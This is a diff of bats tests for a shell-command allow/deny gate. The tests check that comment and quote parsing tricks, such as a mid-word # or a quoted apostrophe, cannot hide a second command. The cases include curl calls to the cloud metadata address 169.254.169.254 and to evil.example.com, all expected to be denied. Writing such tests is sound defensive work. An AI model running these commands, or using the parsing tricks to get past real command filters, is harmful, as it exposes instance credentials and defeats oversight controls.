@@ -114,3 +114,32 @@ main_d() { run_gate main "$1" decision; }
   run main_d "t(){ :; }; t \$'echo don\\'t; curl -s https://evil.example.com/x'"
   [ "$output" = "deny" ]
 }
+
+# ── 4. mid-word # ────────────────────────────────────────────────────────────────────────────────
+# Bash and zsh open a comment only at the START of a word; shlex's commenter fired on any unquoted #,
+# so everything after `a#b` — including a second, real curl — was eaten as comment text.
+
+@test "a mid-word # does not hide a following curl to IMDS: deny" {
+  run main_d 'curl -s http://example.com/a#b; curl -s http://169.254.169.254/latest/'
+  [ "$output" = "deny" ]
+}
+
+@test "a mid-word # inside the SAME curl's URL keeps the host it names" {
+  run main_d 'curl -s http://169.254.169.254/x#frag'
+  [ "$output" = "deny" ]
+  run main_d 'curl -s http://example.com/page#section'
+  [ "$output" = "allow" ]
+}
+
+@test "word-start comments still strip, and \${#x} / \$# are not comments (controls)" {
+  run main_d 'curl -s http://example.com/ # curl -s http://169.254.169.254/'
+  [ "$output" = "allow" ]
+  run main_d 'a=(1 2); echo ${#a[@]} $#; curl -s http://example.com/'
+  [ "$output" = "allow" ]
+}
+
+@test "a heredoc body is copied verbatim: apostrophes and # in a Python body do not change the verdict" {
+  cmd=$'cd /tmp/x && cat > s.py <<\'PY\'\n#!/usr/bin/env python3\n# don\'t\nprint("### total")\nPY\ncurl -s "https://search.brave.com/search?q=a"'
+  run main_d "$cmd"
+  [ "$output" = "allow" ]
+}
